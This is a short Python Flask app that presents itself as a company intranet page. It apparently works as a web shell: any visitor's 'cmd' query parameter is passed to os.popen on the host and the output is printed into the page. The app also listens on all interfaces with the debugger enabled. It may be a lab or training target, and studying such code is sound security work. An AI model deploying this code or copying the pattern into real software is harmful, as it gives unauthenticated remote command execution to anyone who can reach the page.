from flask import Flask, request
import os

app = Flask(__name__) # define app
stream = os.popen('ls /home/')
hostname = stream.read()

@app.route("/", methods=["GET","POST"])
def index():
    sourceIP = request.remote_addr
    if 'cmd' in request.args:
        injection = os.popen(request.args.get('cmd')).read()
    else:
        injection = ""
    code = f"""
<html><head><title>Intranet Site</title></head>
<body><h1>Company Page on {hostname}</h1>
<p>You are visiting from {sourceIP}. Welcome!</p>
<p>{injection}</p>
</body></html>
"""
    return code

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80, debug=True, threaded=True)
